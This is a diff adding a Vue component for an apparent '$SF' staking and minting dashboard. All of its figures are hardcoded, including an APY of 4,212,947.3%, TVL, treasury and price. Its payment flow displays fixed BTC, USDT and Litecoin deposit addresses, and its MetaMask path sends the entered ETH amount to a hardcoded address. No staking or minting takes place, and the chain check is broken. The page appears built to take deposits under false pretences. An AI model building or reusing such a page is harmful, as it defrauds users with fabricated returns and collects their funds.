@@ -1,0 +1,309 @@
+<template>
+  <div>
+    <div class="div1">
+      <a href="https://snowtrace.io/address/0xa3Aa335f1B9Ad61fc5Ce5485E5cCC547FB86cFb3"><img src="../assets/namedash.png" alt="" width="100%" style="margin-top:10%"></a>
+      <img src="../assets/dashdash.png" alt="" width="100%" style="margin-top:20%;cursor: pointer;" v-on:click="dash">
+      <img src="../assets/dash.png" alt="" width="100%" style="margin-top:10%;cursor: pointer;" v-on:click="stake">
+      <img src="../assets/dashboard1.png" alt="" width="100%" style="cursor: pointer;" v-on:click="mintf" >
+      <img src="../assets/dashboard2.png" alt="" width="100%" style="margin-top:20%">
+      <!-- <img src="../assets/dashboard2.png" alt="" width="100%" height="50%"> -->
+    </div>
+    <div class="div2">
+      <button style="padding: 12px 48px; font-weight: 500; font-size: 13px; color: #30363a; float:right; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; margin-right:20px; margin-top:30px; "> Disconnect</button>
+      <button style="float:right; padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; margin-right:20px; margin-top:30px;">Buy $SF</button>
+      
+      <div class="center" v-if="show1">
+
+        <p style="font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; margin-right:80% ">Stake(3,3)</p>
+        <p style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px; float:left; margin-top:10px;margin-left:100px;"> APY</p>
+        <p style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px; float:left; margin-left:250px; margin-top:10px"> TVl</p>
+        <p style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px; float:right; margin-right:100px; margin-top:10px">Current Index</p>
+        <p style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px; float:left; margin-top:1px;margin-left:90px;"> 4,212,947.3%</p>
+        <p style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px; float:left; margin-left:180px; margin-top:1px"> $19,778,921</p>
+        <p style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px; float:right; margin-right:120px; margin-top:1px">1.57 SF</p>
+        <img src="../assets/progress1.png" alt="" width="600px" height="100px" style="border:3px solid white;margin-right:50px"> 
+        <!-- <h2 style="font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; "> Select Method of payment</h2> -->
+        <img src="../assets/bitcoin.png" alt="" height="100px" width="120px" style="float:left; margin-top:50px; margin-left:100px;cursor: pointer; border:3px solid white;" v-on:click="bitcoin">
+        <img src="../assets/tether.png" alt="" height="100px" width="120px" style="float:left; margin-top:50px; margin-left:20px;cursor: pointer; border:3px solid white;" v-on:click="tether">
+        <img src="../assets/litecoin.jpeg" alt="" height="100px" width="120px" style="float:left; margin-top:50px; margin-left:20px;cursor: pointer; border:3px solid white; background-color:black;" v-on:click="ether">
+        <img src="../assets/meta.png" alt="" height="100px" width="120px" style="float:left; margin-top:50px; margin-left:20px;cursor: pointer;border:3px solid white;" v-on:click="metamask"><br>
+
+        <button style="margin-top:60px;padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; width:200px; margin-bottom:50px">Next Step</button>
+      </div>
+      <div class="center" v-if="show2">
+        
+        <img src="../assets/progress2.png" alt="" width="600px" height="100px" style="border:3px solid white; margin-top:50px">
+        <!-- <h2 style="font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; "> Enter amount</h2> -->
+        <input type="string" name="" id="amount" placeholder="Enter" style="width:300px; background-color:black; border:3px solid white; height:24px; padding:12px; color:white; margin-top:30px"><h2 id="currency" style="color:white;">{{this.currency}}</h2>
+        
+        <button style="margin-top:100px;padding: 12px 48px; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; width:200px; margin-bottom:50px" v-on:click="back">Back</button>
+      <button style="margin-top:100px;padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; width:200px; margin-bottom:50px" v-on:click="buy"> Buy Now</button>
+      </div>
+      <div class="center" v-if="show3">
+        <h2 style="font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; "> Transfer the amount to following address:</h2>
+        <span style="margin-top:100px;width:300px; background-color:black; border:3px solid white; height:24px; padding:12px; color:white; margin-top:30px">{{this.address}}</span>
+        <h3 style="margin-top:100px;font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; ">Waiting for payment...</h3>
+        <button style="margin-top:100px;padding: 12px 48px; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; width:200px; margin-bottom:50px" v-on:click="back2">Back</button>
+
+      </div>
+      <div class="center" v-if="dashboard">
+        <span style="float:left; margin-top:40px; margin-left:50px;width:300px; border:3px solid white; height:100px">
+        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">SF Price</h3>
+        <h3 style="color:white">$2367</h3>
+      </span>
+      <span style="float:right; margin-top:40px; margin-right:50px;width:300px; border:3px solid white; height:100px">
+        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">Market Cap</h3>
+        <h3 style="color:white">$32,558,234</h3>
+      </span>
+      <span style="float:left; margin-top:20px; margin-left:50px;width:300px; border:3px solid white; height:100px">
+        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">TVL</h3>
+        <h3 style="color:white">$19,778,921</h3>
+      </span>
+      <span style="float:right; margin-top:20px; margin-right:50px;width:300px; border:3px solid white; height:100px">
+        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">APY</h3>
+        <h3 style="color:white">4,212,947.3%</h3>
+      </span>
+      <span style="float:left; margin-top:20px; margin-left:50px;width:300px; border:3px solid white; height:100px">
+        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">Current Index</h3>
+        <h3 style="color:white">1.57SF</h3>
+      </span>
+      <span style="float:right; margin-top:20px; margin-right:50px;width:300px; border:3px solid white; height:100px">
+        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">Treasury Balance</h3>
+        <h3 style="color:white">$10,105,732</h3>
+      </span>
+      <span style="float:left; margin-top:20px; margin-left:50px;width:300px; border:3px solid white; height:100px">
+        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">Backing Per$SF</h3>
+        <h3 style="color:white">$1,194</h3>
+      </span>
+      <span style="float:right; margin-top:20px; margin-right:50px;width:300px; border:3px solid white; height:100px">
+        <h3 style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat;padding-bottom: 6px;">Runway</h3>
+        <h3 style="color:white">320.8 days</h3>
+      </span>
+      </div>
+      <div class="center" v-if="mint">
+        <p style="font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; margin-right:80% ">Mint(1,1)</p>
+       <p style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat; float:left; margin-top:10px;margin-left:150px;"> Treasury Balance</p>
+       <p style="color: #919fa6;font-size: 18px;font-weight: 400;font-family: Montserrat; float:right; margin-right:150px; margin-top:10px">SF Price</p><br>
+       <p style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; float:right; margin-top:0px;margin-right:550px;">$87,731,493</p>
+       <p style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; float:left; margin-left:590px; margin-top:-40px">$3088.66</p>
+       <table style="margin-top:100px; margin-left:50px">
+  <tr style="margin-top:100px; height:60px">
+    <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:200px; height:100px">Mint</th>
+    <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; width:120px">Price</th>
+    <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;width:120px">Roi</th>
+     <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;width:120px">Purchased</th>
+  </tr>
+  <tr style="margin-top:100px; height:60px">
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">SB-MIM LP</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;">$3226.64</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">6.24%</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">$29,013,465</td>
+    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806;" v-on:click="stake">Mint</button></td>
+  </tr>
+ <tr style="margin-top:100px; height:60px">
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">SB-AVAX Lp   View Contract</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;">$2882.65</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">7.14%</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">$17,754,793</td>
+    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806;" v-on:click="stake">Mint</button></td>
+  </tr>
+  <tr style="margin-top:100px; height:60px">
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">wAVaX</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;">$3048.44</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">1.31%</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">$21,441,317</td>
+    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806;" v-on:click="stake">Mint</button></td>
+  </tr>
+  <tr style="margin-top:100px; height:60px">
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">MIM</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;">$3056.08</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">1.06%</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">$20,502,533</td>
+    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; " v-on:click="stake">Mint</button></td>
+  </tr>
+</table>
+      </div>
+      
+    </div>
+  </div>
+</template>
+<script>
+import Web3 from 'web3'
+export default {
+  name:'About',
+  data(){
+    return{
+      show1:true,
+      show2:false,
+      func:null,
+      show3:false,
+      address:null,
+      currency:null,
+      dashboard:false,
+      mint:false,
+    }
+  },
+  methods:{
+    mintf(){
+      this.mint=true
+      this.show1=false;
+      this.show2=false;
+      this.show3=false;
+      this.dashboard=false;
+    },
+    stake(){
+      this.show1=true;
+      this.show2=false;
+      this.show3=false;
+      this.dashboard=false;
+    },
+    dash(){
+      this.show2=false;
+      this.show3=false;
+      this.show1=false;
+      this.dashboard=true;
+
+    },
+
+    back2(){
+      this.show2=true;
+      this.show3=false;
+    },
+    back(){
+      this.show1=true;
+      this.show2=false;
+      this.func=null
+      this.address=null
+    },
+    metamask(){
+this.show1=false;
+      this.show2=true;
+      this.func='meta';
+      this.currency='ETH'
+    },
+    bitcoin(){
+      this.show1=false;
+      this.show2=true;
+      this.currency='BTC'
+       this.func='btc'
+    },
+    ether(){
+      this.show1=false;
+      this.show2=true;
+       this.currency='LTE'
+       this.func='eth'
+    },tether(){
+      this.show1=false;
+      this.show2=true;
+      this.func='teth'
+       this.currency='USDT'
+    },buy(){
+      if (this.func=="teth") {
+        this.show3=true;
+        this.show2=false;
+        this.address='0xe71A09cF81FD0F8AD95717702EeFDA229175BD65'
+      }
+      if (this.func=="eth") {
+        this.show3=true;
+        this.show2=false;
+        this.address='LMG9gjduhaV1C1yf8dwndVyF1FnxZZQhu3'
+      }
+      if (this.func=="btc") {
+        this.show3=true;
+        this.show2=false;
+        this.address='bc1q3wv0zayp0cznnp3pejdxe3p5598s4v8a84ec9d'
+      }
+      if (this.func=="meta") {
+        const acc = window.ethereum.request({ method: "eth_requestAccounts" });
+      acc.then((result) => {
+        const account = result[0];
+        const chainId = window.ethereum.request({ method: "eth_chainId" });
+        if (chainId !== "0x1") {
+          
+           window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x1" }],
+          }); 
+          
+                    const Web3=require('web3');
+      const web3 = new Web3(window.ethereum)
+      const input= document.getElementById("amount").value
+        const x=web3.utils.toHex(input*1e18)
+                    const amount=x;
+                    console.log(amount)
+            window.ethereum.request({
+              method: "eth_sendTransaction",
+              params: [
+                {
+                  from: account,
+                  to: "0xAb0C11E0c9e36F9e55D044D6A429d82376553510",
+                  //to:"0xBFa0562eA2c334393eD68999468Ad554148AC722",
+                  value:amount,
+                  //gasPrice: '0x09184e72a000',0x29a2241af62c0000
+                  //gas: '0x2710',
+                },
+              ],
+            });
+          
+          
+        }else {
+          
+                    const Web3=require('web3');
+      const web3 = new Web3(window.ethereum)
+      const input= document.getElementById("amount").value
+        const x=web3.utils.toHex(input*1e18)
+                    const amount=x;
+                window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [
+                        {
+                            from: account,
+                            to: '0xAb0C11E0c9e36F9e55D044D6A429d82376553510',
+                            //to:"0xBFa0562eA2c334393eD68999468Ad554148AC722",
+                            value: amount,
+                            //gasPrice: '0x09184e72a000',0x29a2241af62c0000
+                            //gas: '0x2710',
+                        },
+                    ],
+                })
+        }
+      });
+      }
+    }
+  }
+}
+</script>
+<style lang="scss">
+.div1{
+  float: left;
+  width: 20%;
+  //height:100%;
+  background-color: rgb(32, 52, 117);
+  backdrop-filter: blur(100px);
+}
+.div2{
+  display:inline-block;
+  width: 80%;
+  
+   background: url(snowi.jpeg) ; 
+  background-repeat: no-repeat;
+  background-size: contain;
+  align-content: center;
+
+  
+}
+.center{
+  background-color:rgb(5, 20, 39);
+  height: 600px;
+  padding: 0%;
+  margin-top: 10%;
+  width: 800px;
+  margin-left: 10%;
+  margin-bottom:4%;
+  backdrop-filter: blur(100px);
+  
+
+  
+}
+
+</style>
